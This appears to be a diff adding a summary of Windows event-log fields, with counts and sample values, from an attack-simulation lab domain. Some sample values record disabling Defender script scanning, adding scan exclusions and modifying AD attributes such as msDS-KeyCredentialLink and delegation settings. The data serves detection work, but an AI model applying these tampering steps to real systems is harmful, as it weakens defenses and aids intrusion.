+    - SHA1=C47D0A483AF0CC97FC794FEDE2AEE046FC4ABEDD,MD5=9A83046AAC1E5BC21BD72B4777E19784,SHA256=5B4C6C9B3EB61D72378E51964091FFF230597AEBDA1657263493ED1FD2C3AFF2,IMPHASH=00000000000000000000000000000000
+    - SHA1=C7C4CE6FDC88E63ABAF8E662AEA1456161D9EABC,MD5=84296C8E9FAB976ACBA0A65907A12086,SHA256=E94CC8AAA757D0E0070E41D252ED33085006D334049A9CA626B9467F9E59F542,IMPHASH=7631A79A9071099FA4803E1C4C5DF207
+    - SHA1=8C77A5B8CE86173D5BAB5F6D3FCE5F72E9BD0F7E,MD5=F09CFE61B8E8D4361095FE425DECD824,SHA256=6A9B87D693A62408407BC1B4B8A866237CC21DF51001724C31FE25AB7D2EE25C,IMPHASH=00000000000000000000000000000000
+
+Contents (seen 196 times)
+  Sample values:
+    - [ZoneTransfer]  ZoneId=3  ReferrerUrl=https://www.chiark.greenend.org.uk/  HostUrl=https://the.earth.li/~sgtatham/putty/0.77/w64/plink.exe
+    - -
+    - [ZoneTransfer]  ZoneId=3  ReferrerUrl=https://detectiontest.screenconnect.com/  HostUrl=https://detectiontest.screenconnect.com/Bin/ScreenConnect.Client.exe?h=instance-ffx0xs-relay.screenconnect.com&p=443&k=BgIAAACkAABSU0ExAAgAAAEAAQDdggorxoadw7udX06fCku1ldF7rN84hmV6d0KM%2FUrqwFBZe%2Fd%2BydjYIZaBpfRqHzGPXMoGpTzSDWD6%2BbUQyoqD%2F3SogFpx8fydSd9zu5MJyaN8mnYDVBMg1HDAd%2BW3wOuobuIU%2FZGLODLKYXG48ims7cObjXy8HPgrH8SzoeMQTxnstNvP9pgZ7PvctSVDuNEPSRb77Wc74VpPwVWhGAiJe5tEOTrQTp9k454Jg71OQuaLds5phFa2coE8XAo4sTccWH3lnrIYFJjqzrik6mDNSJXQjjACFS57R2kct5JNrTq37ommwWQak6gBaV1PUXKm9OW%2Fs38YUm5Xge4Cs9Xf&s=b380001c-a1c2-4345-9474-0bd482ff92bf&i=Untitled%20Session&e=Support&y=Guest&r=
+    - [ZoneTransfer]  ZoneId=3  ReferrerUrl=https://detectiontest.screenconnect.com/
+    - [ZoneTransfer]  ZoneId=3
+
+TargetLogonGuid (seen 170 times)
+  Sample values:
+    - {00000000-0000-0000-0000-000000000000}
+    - {f95ff2d8-81fc-1a1b-5104-6ab0cb080467}
+    - {995e4d02-3079-8f4b-3cfb-beca4256724f}
+    - {36ca3c7b-9897-33fb-57b5-06bc26c0f84a}
+    - {a6a7cc79-9fb2-924b-579c-1eaca2dfa001}
+
+TargetServerName (seen 170 times)
+  Sample values:
+    - win-dc-mvelazco-02713-392.attackrange.local
+    - ar-win-dc
+    - localhost
+    - ar-win-2.attackrange.local
+    - ar-win-dc$
+
+TargetInfo (seen 170 times)
+  Sample values:
+    - win-dc-mvelazco-02713-392.attackrange.local
+    - HTTP/ar-win-dc
+    - localhost
+    - HTTP/ar-win-2.attackrange.local
+    - ar-win-2.attackrange.local
+
+PreviousCreationUtcTime (seen 168 times)
+  Sample values:
+    - 2021-04-22 18:34:14.370
+    - 2021-04-22 18:36:14.375
+    - 2021-04-22 19:59:52.496
+    - 2021-04-22 20:00:14.649
+    - 2021-04-22 20:01:52.516
+
+Service (seen 138 times)
+  Sample values:
+    - -
+    - LsaRegisterLogonProcess()
+
+SourceProcessGuid (seen 122 times)
+  Sample values:
+    - {D28789B6-7CDA-5FA1-0D01-000000008801}
+    - {62e4af84-15aa-6735-940e-00000000f601}
+    - {51A89197-3B87-654E-0900-000000001D00}
+    - {0F9A6540-3D66-63F5-5C09-00000000C102}
+    - {834264DD-F154-6203-ACFC-020000002702}
+
+TargetProcessGuid (seen 122 times)
+  Sample values:
+    - {D28789B6-7C62-5FA1-0B00-000000008801}
+    - {62e4af84-ebbf-6734-010a-00000000f601}
+    - {51A89197-1026-6631-1406-000000001D00}
+    - {0F9A6540-4020-63F5-B809-00000000C102}
+    - {0F9A6540-3F94-63F5-A709-00000000C102}
+
+NewThreadId (seen 122 times)
+  Sample values:
+    - 4740
+    - 5072
+    - 4464
+    - 656
+    - 3376
+
+StartAddress (seen 122 times)
+  Sample values:
+    - 0x00000161B50D082C
+    - 0x0000000000790000
+    - 0x00007FFF52045660
+    - 0x0000017DACD70000
+    - 0x000002BB84710000
+
+StartModule (seen 122 times)
+  Sample values:
+    - -
+    - C:\Windows\System32\KERNELBASE.dll
+    - C:\Windows\SYSTEM32\ntdll.dll
+
+StartFunction (seen 122 times)
+  Sample values:
+    - -
+    - CtrlRoutine
+
+Product Name (seen 121 times)
+  Sample values:
+    - Microsoft Defender Antivirus
+
+Product Version (seen 121 times)
+  Sample values:
+    - 4.18.24060.7
+    - 4.18.24070.5
+    - 4.18.23050.5
+    - 4.18.23100.2009
+
+State (seen 110 times)
+  Sample values:
+    - Started
+
+Version (seen 110 times)
+  Sample values:
+    - 12.01
+    - 12.0
+    - 13.01
+    - 12.02
+    - 12.03
+
+SchemaVersion (seen 110 times)
+  Sample values:
+    - 4.40
+    - 4.50
+    - 4.23
+
+ObjectName (seen 110 times)
+  Sample values:
+    - -
+    - \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa
+
+HandleId (seen 110 times)
+  Sample values:
+    - 0x12cc
+    - 0x7b8
+    - 0x520
+    - 0x1948
+    - 0x8c
+
+ObjectType (seen 108 times)
+  Sample values:
+    - Token
+    - -
+
+OldSd (seen 104 times)
+  Sample values:
+    - D:(A;;GA;;;SY)(A;;GA;;;NS)
+    - D:(A;;GA;;;SY)(A;;RCGXGR;;;BA)
+    - D:(A;;GA;;;SY)(A;;GA;;;LS)
+
+NewSd (seen 104 times)
+  Sample values:
+    - D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-86-615999462-62705297-2911207457-59056572-3668589837)
+    - D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-80-3290392786-819420393-1694314755-3737624005-3552167228)
+    - D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;NT TASK\Microsoft-Windows-Ras-MobilityManager)(A;;GA;;;S-1-5-87-1990970548-589041977-4026041562-2928935477-2389476198)(A;;GA;;;NT TASK\Microsoft-Windows-AppID-EDP Policy Manager)(A;;GA;;;S-1-5-87-3927079284-1085944716-2389029323-299627631-382947820)(A;;GA;;;NT TASK\Microsoft-Windows-Shell-IndexerAutomaticMaintenance)
+    - D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;NT TASK\Microsoft-Windows-Speech-SpeechModelDownloadTask)
+    - D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;NT SERVICE\sppsvc)
+
+Old Value (seen 93 times)
+  Sample values:
+    - Default\CoreService\MemorySensor\EnableLeakDetector = 0x0
+    - HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableScriptScanning = 0x0
+    - Default\Windows Defender Exploit Guard\Controlled Folder Access\EnableControlledFolderAccess = 0x0
+    - HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\SubmitSamplesConsent = 0x1
+    - Default\Real-Time Protection\DisableScriptScanning = 0x0
+
+New Value (seen 93 times)
+  Sample values:
+    - HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Temp\4 = 0x0
+    - HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Temp\3 = 0x0
+    - HKLM\SOFTWARE\Microsoft\Windows Defender\CoreService\MemorySensor\EnableLeakDetector = 0x0
+    - HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableScriptScanning = 0x1
+    - HKLM\SOFTWARE\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access\EnableControlledFolderAccess = 0x0
+
+OpCorrelationID (seen 83 times)
+  Sample values:
+    - {49BDC008-3FB2-4AFD-93B6-54FDCD9E6051}
+    - {5861FBBB-34C4-45A6-889B-4E2BE3CF0F19}
+    - {86DEFA57-CCF0-462F-BEA6-74425946EF24}
+    - {478F0FE9-0E60-4189-B0D0-2D0E4D6DDC04}
+    - {CD6962DA-1395-4A70-A05F-465CA8AFD2A5}
+
+AppCorrelationID (seen 83 times)
+  Sample values:
+    - -
+
+DSName (seen 83 times)
+  Sample values:
+    - attackrange.local
+
+DSType (seen 83 times)
+  Sample values:
+    - %%14676
+
+ObjectDN (seen 83 times)
+  Sample values:
+    - DC=attackrange,DC=local
+    - CN=Backup Operators,CN=Builtin,DC=attackrange,DC=local
+    - ou=IT Staging,OU=Stage,DC=attackrange,DC=local
+    - CN=Users,DC=attackrange,DC=local
+    - CN=unrpiv,CN=Users,DC=attackrange,DC=local
+
+ObjectGUID (seen 83 times)
+  Sample values:
+    - {C5F5FDB6-AC1C-4AC8-A79C-FCB2457875EE}
+    - {33F63965-2F57-4093-8CB3-6B2BE01F6861}
+    - OU=IT Staging,OU=Stage,DC=attackrange,DC=local
+    - {1450C195-D3E8-4D18-9177-488C0CBD28B0}
+    - {EEB5AA3C-3F52-4C7A-A3A4-9B41A343B73B}
+
+ObjectClass (seen 83 times)
+  Sample values:
+    - domainDNS
+    - group
+    - organizationalUnit
+    - container
+    - user
+
+Configuration (seen 81 times)
+  Sample values:
+    - C:\Program Files\ansible\sysmon\SwiftOnSecurity.xml
+    - C:\Program Files\ansible\AttackRangeSysmon.xml
+    - c:\Program Files\ansible\AttackRangeSysmon.xml
+    - C:\Program Files\ansible\SwiftOnSecurity.xml
+
+ConfigurationFileHash (seen 81 times)
+  Sample values:
+    - SHA256=62A2EB8C481DC0CD2ABCCEEDCD9DD11AF9A66D715E53FA8B7B60052B094E75F7
+    - SHA256=2C9D7A35C48E03F6D6841E32AEE8E156B985F220C9F0A4F8C06BA655278EF4E5
+    - SHA1=662E68DD6B3360E156BDE1F54FD3ED5BB76E8AFC
+    - SHA256=C4B0E46F4155BA37AA06C7AE47B79C4418F8A01D449A7BCE838CF0ADB1C338B3
+    - SHA256=DBC581B8781C7283AC913B343F0D49CFDF64E92651D5AF073FDC844C603C51EC
+
+CategoryId (seen 81 times)
+  Sample values:
+    - %%8273
+    - %%8276
+    - %%8280
+    - %%8279
+    - %%8278
+
+SubcategoryId (seen 81 times)
+  Sample values:
+    - %%12548
+    - %%13312
+    - %%14339
+    - %%14337
+    - %%14336
+
+SubcategoryGuid (seen 81 times)
+  Sample values:
+    - {0CCE921B-69AE-11D9-BED3-505054503030}
+    - {0cce922b-69ae-11d9-bed3-505054503030}
+    - {0CCE922B-69AE-11D9-BED3-505054503030}
+    - {0CCE9242-69AE-11D9-BED3-505054503030}
+    - {0CCE9240-69AE-11D9-BED3-505054503030}
+
+AuditPolicyChanges (seen 81 times)
+  Sample values:
+    - %%8449, %%8451
+    - %%8448, %%8450
+    - %%8448
+
+OperationType (seen 78 times)
+  Sample values:
+    - %%14674
+    - %%14675
+    - %%1904
+    - %%1905
+
+AttributeLDAPDisplayName (seen 76 times)
+  Sample values:
+    - nTSecurityDescriptor
+    - msDS-KeyCredentialLink
+    - msDS-AllowedToDelegateTo
+    - msTSInitialProgram
+    - scriptPath
+
+AttributeSyntaxOID (seen 76 times)
+  Sample values:
+    - 2.5.5.15
+    - 2.5.5.7
+    - 2.5.5.12
+    - 2.5.5.17
+    - 2.5.5.9
+
+AttributeValue (seen 76 times)
+  Sample values:
+    - O:BAG:BAD:AI(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-390003789-444691441-1275789787-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCRPWPRC;;;S-1-5-21-390003789-444691441-1275789787-3445)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-390003789-444691441-1275789787-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:AI(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;CISAFA;LCRPWPRCWDWO;;;DC)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)(AU;CISAFA;LCRPWPRCWDWO;;;WD)
+    - O:BAG:BAD:AI(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-390003789-444691441-1275789787-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-390003789-444691441-1275789787-519)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-390003789-444691441-1275789787-3445)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:AI(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;CISAFA;LCRPWPRCWDWO;;;DC)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)(AU;CISAFA;LCRPWPRCWDWO;;;WD)
+    - O:BAG:BAD:AI(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-390003789-444691441-1275789787-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-390003789-444691441-1275789787-519)(A;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-390003789-444691441-1275789787-3445)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:AI(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;CISAFA;LCRPWPRCWDWO;;;DC)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)(AU;CISAFA;LCRPWPRCWDWO;;;WD)
+    - O:BAG:BAD:AI(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-390003789-444691441-1275789787-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCRPWPCRRC;;;S-1-5-21-390003789-444691441-1275789787-3445)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-390003789-444691441-1275789787-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:AI(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;CISAFA;LCRPWPRCWDWO;;;DC)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)(AU;CISAFA;LCRPWPRCWDWO;;;WD)
+    - O:DAG:DAD:AI(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AO)(A;;LCRPLORC;;;PS)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;OICIID;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIID;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-39000